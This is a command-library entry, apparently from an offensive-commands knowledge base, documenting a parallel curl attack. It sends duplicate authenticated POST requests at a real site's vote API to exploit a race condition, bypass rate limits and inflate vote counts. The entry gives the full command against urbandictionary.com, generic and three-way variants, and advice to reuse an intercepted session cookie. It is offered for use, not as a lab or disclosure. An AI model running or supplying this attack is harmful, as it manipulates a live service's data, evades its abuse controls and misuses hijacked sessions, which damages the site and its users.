---
id: cmd-parallel-curl-001
data: >-
  (curl -X POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest"
  -d "vote=up&defid=123" https://www.urbandictionary.com/api/vote ) & (curl -X
  POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest" -d
  "vote=up&defid=123" https://www.urbandictionary.com/api/vote ) ; wait
tags:
  - race-condition
  - http-replay
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:18.888Z'
verified: false
validated: true
submitted: true
---
# Parallel Curl Vote Execution

## Command

```bash
(curl -X POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest" -d "vote=up&defid=123" https://www.urbandictionary.com/api/vote ) & (curl -X POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest" -d "vote=up&defid=123" https://www.urbandictionary.com/api/vote ) ; wait
```

## Description

This command executes two identical curl requests to submit votes concurrently by running them in background processes (&), exploiting race conditions in the server. The `wait` ensures completion. Use after intercepting a real request; replace placeholders with actual values. Ideal for bypassing rate limits in web apps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H "Cookie: ..."` | Session cookie from interception | Yes |
| `-H "X-Requested-With: ..."` | AJAX header to mimic browser | Yes |
| `-d "vote=up&defid=123"` | POST data for vote action and ID | Yes |
| `https://.../api/vote` | Target endpoint URL | Yes |
| `&` | Background execution for parallelism | Yes |
| `; wait` | Wait for backgrounds to finish | Yes |

## Examples

### Basic Usage

```bash
(curl -X POST -H "Cookie: abc" -d "vote=up" https://example.com/vote ) & (curl -X POST -H "Cookie: abc" -d "vote=up" https://example.com/vote ) ; wait
```

### Advanced Usage

For three parallel votes:

```bash
(curl ... ) & (curl ... ) & (curl ... ) ; wait
```

## Expected Output

No stdout from curl if successful (HTTP 200 implied); verify by refreshing the target page to see inflated vote counts. Errors may include 403 if cookies invalid.

## Related

- [[Related Procedure: Execute Parallel Curl Votes]]
